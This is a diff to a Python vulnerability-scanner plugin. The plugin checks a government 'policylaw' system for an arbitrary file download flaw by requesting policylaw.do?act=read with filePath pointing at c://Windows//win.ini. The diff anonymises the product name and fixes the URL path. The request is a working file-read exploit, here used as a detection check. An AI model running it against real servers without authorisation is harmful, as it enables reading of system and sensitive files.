@@ -6,17 +6,18 @@ hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
     vuln_id = 'policylaw_0000' # 平台漏洞编号，留空
-    name = 'policylaw政府通用系统任意文件下载漏洞' # 漏洞名称
+    name = '某政府通用系统任意文件下载' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.FILE_DOWNLOAD # 漏洞类型
     disclosure_date = '2014-08-28'  # 漏洞公布时间
     desc = '''
-        licylaw政府通用系统任意文件下载漏洞
+        某政府通用系统任意文件下载漏洞。
+        /policylaw/policylaw.do?act=read&filePath=c://Windows//win.ini&fileContentType=
     ''' # 漏洞描述
-    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=068484' # 漏洞来源
+    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=068484
     cnvd_id = '' # cnvd漏洞编号
     cve_id = '' #cve编号
-    product = 'policylaw'  # 漏洞应用名称
+    product = '某政府通用系统'  # 漏洞应用名称
     product_version = ''  # 漏洞应用版本
 
 
@@ -33,7 +34,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            url=arg+'policylaw/policylaw.do?act=read&filePath=c://Windows//win.ini&fileContentType='
+            url=arg+'/policylaw/policylaw.do?act=read&filePath=c://Windows//win.ini&fileContentType='
             code,head,res,errcode,_=hh.http(url)
             if code==200 and "[extensions]" in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
